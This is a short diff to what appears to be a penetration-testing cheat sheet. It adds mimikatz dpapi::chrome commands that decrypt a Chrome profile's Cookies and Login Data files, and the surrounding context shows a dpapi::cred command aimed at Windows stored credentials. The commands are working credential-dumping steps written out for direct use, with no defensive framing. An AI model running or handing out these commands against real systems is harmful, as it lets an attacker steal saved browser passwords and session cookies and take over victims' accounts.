@@ -10,3 +10,11 @@ mimikatz dpapi::cred /in:C:\Users\NyaMeeEain\AppData\Local\Microsoft\Credentials
 
 
 ```
+
+### Chrome
+```
+dpapi::chrome /in:"C:\Users\NyaMeeEain\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+dpapi::chrome /in:"C:\Users\NyaMeeEain\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+```
